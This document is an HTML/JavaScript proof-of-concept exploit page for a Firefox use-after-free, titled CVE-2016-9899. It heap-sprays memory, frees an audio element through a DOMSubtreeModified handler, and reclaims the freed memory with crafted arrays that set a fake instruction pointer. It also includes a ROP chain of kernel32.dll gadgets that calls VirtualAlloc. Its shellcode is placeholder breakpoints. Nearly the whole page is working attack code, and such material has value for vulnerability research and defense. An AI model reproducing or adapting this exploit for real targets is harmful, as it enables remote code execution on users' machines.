<!DOCTYPE html>
<html>
  <head>
  <!-- <meta http-equiv="refresh" content="1"/> -->
  <meta http-equiv="content-type" content="text/html; charset=UTF-8">
  <meta http-equiv="Expires" content="0" />
  <meta http-equiv="Cache-Control" content="no-store, no-cache, must-revalidate" />
  <meta http-equiv="Cache-Control" content="post-check=0, pre-check=0" />
  <meta http-equiv="Pragma" content="no-cache" />
  <style type="text/css">
   body{
        background-color:lime;
        font-color:red;
   };
  </style>

  <script type="text/javascript" language="JavaScript">
   var doc = null;
   var cnt = 0;
  
   function m(blocks,size) {
            var arr = [];
            for(var i=0;i<blocks;i++) {
                arr[i] = new Array(size);
                for(var j=0;j<size;j+=2) {
                    arr[i][j] = 0x41414141;
                    arr[i][j+1] = 0x42424242;
                }
            }
            return arr;
    } 
       
    function handler() {    //free
             if(cnt > 0) return;
             doc.body.appendChild(document.createElement("audio")).remove();      
             m(1024,1024);   
             ++cnt;
    }
 
    function trigger() {
             if(cnt  > 0) {
                var pl = new Array();
                doc.getElementsByTagName("*")[0].removeEventListener("DOMSubtreeModified",handler,false);
                alert("Free HTMLAudioElement Object");
                for(var i=0;i<4096;i++) {           //replace
                    pl[i]=new Uint8Array(1000);
                    pl[i][0] = 0x10;
                    pl[i][1] = 0x22;
                    pl[i][2] = 0x30;
                    pl[i][3] = 0x20; //eip  
                    for(var j=4;j<(1000) - 4;j++) pl[i][j] = 0x91; 
                   // pl[i] = document.createElement('media');
                    //document.body.appendChild(pl[i]);
                }
                window.pl = pl
                alert("Set Fake Structure");
                document.getElementById("t1").remove(); //re-use
             }
    }
 
    function testcase()
    {
    		 alert("Heap Spray Done!");
         var df = m(4096,1000);
         document.body.setAttribute('df',df);
         doc = document.getElementById("t1").contentWindow.document;
         doc.getElementsByTagName("*")[0].addEventListener("DOMSubtreeModified",handler,false); 
         doc.getElementsByTagName("*")[0].style = "ANNNY";
         alert("Trigger Exploit");
         setInterval("trigger();",1000);   
 
    }
  </script>
  <title>Firefox < 50.1.0 Use After Free (CVE-2016-9899) </title>
  </head>
  <body>
	<div id="blah"></div>
   	<script language = 'javascript'>
		var div_container = document.getElementById("blah")
		div_container.style.cssText = "display:none";
		var data;
		offset = 0x104;
		junk = unescape("%u2020%u2020");
		while(junk.length < 0x1000) junk += junk;
    rop = unescape(
    "%u4894%u724f" + // xchg edx,esp
    "%udf32%u7c80" + // 0x7c80df32 : ,# POP EBP # RETN [kernel32.dll] 
    "%udf32%u7c80" + // 0x7c80df32 : ,# skip 4 bytes [kernel32.dll]
    "%uae28%u7c81" + // 0x7c81ae28 : ,# POP EBX # RETN [kernel32.dll] 
    "%u0001%u0000" + // 0x00000001 : ,# 0x00000001-> ebx
    "%uf30d%u7c87" + // 0x7c87f30d : ,# POP EDX # POP EAX # POP EBP # RETN [kernel32.dll] 
    "%u1000%u0000" + // 0x00001000 : ,# 0x00001000-> edx
    "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
    "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
    "%ue022%u7c80" + // 0x7c80e022 : ,# POP ECX # POP EBP # POP ECX # POP EBX # RETN 0x04 [kernel32.dll] 
    "%u0040%u0000" + // 0x00000040 : ,# 0x00000040-> ecx
    "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
    "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
    "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
    "%u0afe%u7c81" + // 0x7c810afe : ,# POP EDI # RETN [kernel32.dll] 
    "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
    "%uae29%u7c81" + // 0x7c81ae29 : ,# RETN (ROP NOP) [kernel32.dll]
    "%u7a73%u7c81" + // 0x7c817a73 : ,# POP ESI # RETN [kernel32.dll] 
    "%u9141%u7c81" + // 0x7c819141 : ,# JMP [EAX] [kernel32.dll]
    "%uf229%u7c87" + // 0x7c87f229 : ,# POP EAX # RETN [kernel32.dll] 
    "%u1244%u5adc" + // 0x5adc1244 : ,# ptr to &VirtualAlloc() (skipped module criteria, check if pointer is reliable !) [IAT UxTheme.dll]
    "%u3024%u7c80" + // 0x7c803024 : ,# PUSHAD # RETN 0x06 [kernel32.dll] 
    "%u69f0%u7c83" + // 0x7c8369f0 : ,# ptr to 'call esp' [kernel32.dll]
    ""); //  : 
		shellcode = unescape("%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc");
		data = junk.substring(0,offset)+rop+shellcode
		data += junk.substring(0,0x800-offset-rop.length-shellcode.length);
		while(data.length < 0x80000) data += data;
		for(var i=0;i<500;i++)
		{
			var obj = document.createElement("button");
			obj.title = data.substring(0,0x40000-0x58);
			div_container.appendChild(obj);
		}
		alert("spray done");
	</script>
	<iframe src='about:blank' id='t1' width="100%"></iframe>
	<script language = 'javascript'>
	testcase();
	</script>
  </body>
</html>